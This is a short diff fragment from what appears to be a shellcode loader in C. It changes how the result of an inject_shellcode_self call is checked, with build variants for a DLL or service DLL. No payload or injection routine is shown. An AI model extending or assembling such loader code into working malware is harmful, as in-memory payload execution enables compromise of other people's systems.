@@ -66,15 +66,15 @@ int _main(int argc, char** argv) {
     #endif
     HANDLE hThread = (HANDLE)-1;
     #if defined(SHAREDOBJECT) || defined(SERVICE_DLL)
-        NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, FALSE, sleep_time);
+        LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, FALSE, sleep_time);
     #else
-        NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);
+        LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);
     #endif
-    if (NT_FAIL(status) || hThread == (HANDLE)-1) {
+    if (!allocation || hThread == (HANDLE)-1) {
         #ifdef _DEBUG_
-            printf("inject_shellcode_self: ERROR 0x%x", status);
+            printf("inject_shellcode_self: ERROR 0x%x", allocation);
         #endif
-        return status;
+        return -1;
     }
 
     #ifdef _DEBUG_
